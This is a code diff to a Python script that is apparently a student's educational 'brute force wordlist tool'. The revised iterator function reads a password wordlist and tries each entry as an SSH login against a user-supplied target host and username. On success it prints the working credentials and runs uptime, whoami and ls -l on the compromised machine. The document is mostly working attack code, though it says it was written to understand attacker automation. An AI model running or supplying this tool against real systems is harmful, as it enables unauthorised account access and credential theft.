@@ -3,7 +3,7 @@
 
 # Script Name: Automated Brute Force Wordlist Tool Pt. 2
 # Author: Shay Crane
-# Date of last revision: 10/24/2022
+# Date of last revision: 10/25/2022
 # Purpose:  continue the development of a custom tool that performs
 #           brute force attacks to better understand the types of
 #           automation employed by malicious hackers. 
@@ -11,10 +11,7 @@
 
 
 #import libraries
-import time
-import getpass
-import sys
-from tkinter.messagebox import YES
+import time, getpass, sys
 from pexpect import pxssh
 
 
@@ -33,48 +30,54 @@ def menu():
     else: 
         sys.exit 
 
-
-#ssh on remote server
-def sshtoremote():
-    session=pxssh.pxssh()
-    host=input("Provide an IP address: ")
-    username=input("Provide a username: ")
-    pwd=getpass.getpass(prompt='Enter a password: ')
-    try:
-        session.login(host,username,pwd)
-        session.sendline('uptime')
-        session.prompt()
-        print(session.before) #prints everything before the prompt
-        session.sendline('whoami')
-        session.prompt()
-        print(session.before)
-        session.logout()
-    except pxssh.ExceptionPxssh as e:
-        print("pxssh failed on login.")
-        print(e)
-#       if success==0:
-        searchfile()
-
-#search file for user input string
-def searchfile():
-    path=input("Enter your dictionary's filepath:\n")
-    file=open(path)
-    line=file.readline()
-    while line:
-        line=line.rstrip()
-        word=line
-        print(word)
-        time.sleep(1)
-        line=file.readline()
-    file.close()
-
-#iterator
+#iterates user input to access a given system
 def iterator():
-    sshtoremote()
+    host=input("Enter target host IP address: ")
+    username=input("Enter target username: ")
+    path=input("Enter the filepath to your wordlist:\n ")
+    file=open(path,encoding="ISO-8859-1")
+    line=file.readline()
+    success="no"
+    if success=="no":
+        while line:
+            line=line.rstrip()
+            pwd=line
+            print(f"Checking '{pwd}'...")
+            session=pxssh.pxssh()
+            try:
+                session.login(host, username, pwd)
+                print("\nACCESS GRANTED.")
+                session.sendline('uptime')
+                session.prompt()
+                print(f"the username is: {str(session.before)[12:-5]} the password is: {pwd}")
+                print(session.before) #prints everything before the prompt
+                session.sendline('whoami')
+                session.prompt()
+                print((session.before).decode())
+                session.sendline("ls -l")
+                session.prompt()
+                print((session.before).decode())
+                session.logout()
+                success="yes"
+                print("[*] MISSION ACCOMPLISHED. Please wait while I return you to the menu...")
+                break
 
-    searchfile()
-    menu()
+            except pxssh.ExceptionPxssh as e:
+                print("Your attempt at login access has failed.")
+                print(e)
 
+            except KeyboardInterrupt:
+                print("\n\n[*] PROCESS INTERRUPTED.")
+                sys.exit()
+
+            time.sleep(.5)
+            line=file.readline()
+
+        file.close()
+
+    else: 
+        print("[*] MISSION ACCOMPLISHED. Please wait while I return you to the menu...")
+        menu()
 
 #password check
 def password_check():
@@ -87,7 +90,7 @@ def password_check():
         if pwrd in content:
             print("Your password has been found in your wordlist.")
         else: 
-            print("{pwrd} was not found in your wordlist")
+            print("{pwrd} was NOT FOUND in your wordlist. Please wait while I return you to the main menu.")
             menu()
 
 #main
